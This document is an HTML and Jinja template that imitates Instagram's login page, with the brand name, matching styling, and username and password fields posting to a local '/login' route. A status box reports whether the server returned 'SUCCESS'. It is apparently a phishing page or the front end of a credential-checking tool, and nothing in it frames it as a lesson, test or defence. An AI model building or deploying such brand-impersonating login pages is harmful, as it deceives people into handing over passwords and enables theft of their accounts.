<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
            width: 350px;
            text-align: center;
        }
        .logo {
            font-size: 24px;
            font-weight: 600;
            color: #0095f6;
            margin-bottom: 25px;
            letter-spacing: -0.5px;
        }
        .input-group {
            position: relative;
            margin-bottom: 15px;
        }
        input {
            width: 100%;
            padding: 10px 10px 10px 45px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 14px;
            box-sizing: border-box;
            outline: none;
            transition: border-color 0.1s;
        }
        input:focus {
            border-color: #0095f6;
        }
        .icon {
            position: absolute;
            left: 12px;
            top: 50%;
            transform: translateY(-50%);
            color: #8e8e8e;
            font-size: 16px;
        }
        button {
            background-color: #0095f6;
            color: white;
            border: none;
            padding: 10px;
            width: 100%;
            border-radius: 4px;
            cursor: pointer;
            font-weight: 600;
            font-size: 14px;
            margin-top: 15px;
        }
        button:hover {
            background-color: #1877f2;
        }
        .status {
            margin-top: 20px;
            padding: 10px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 600;
            display: none; /* Hidden by default */
        }
        .success { background-color: #d1fae5; color: #065f46; display: block; }
        .failure { background-color: #fee2e2; color: #991b1b; display: block; }
        
        .help-link {
            display: block;
            text-align: center;
            margin-top: 15px;
            font-size: 12px;
            color: #00376b;
            text-decoration: none;
            font-weight: 600;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">Instagram</div>
        
        <form action="/login" method="post">
            <div class="input-group">
                <span class="icon">👤</span>
                <input type="text" name="username" placeholder="Phone number, username, or email" required>
            </div>
            <div class="input-group">
                <span class="icon">🔒</span>
                <input type="password" name="password" placeholder="Password" required>
            </div>
            <button type="submit">Log In</button>
        </form>
        
        {% if result %}
        <div class="status {% if 'SUCCESS' in result %}success{% else %}failure{% endif %}">
            {{ result }}
        </div>
        {% endif %}
        
        <a href="#" class="help-link">Forgot password?</a>
    </div>
</body>
</html>
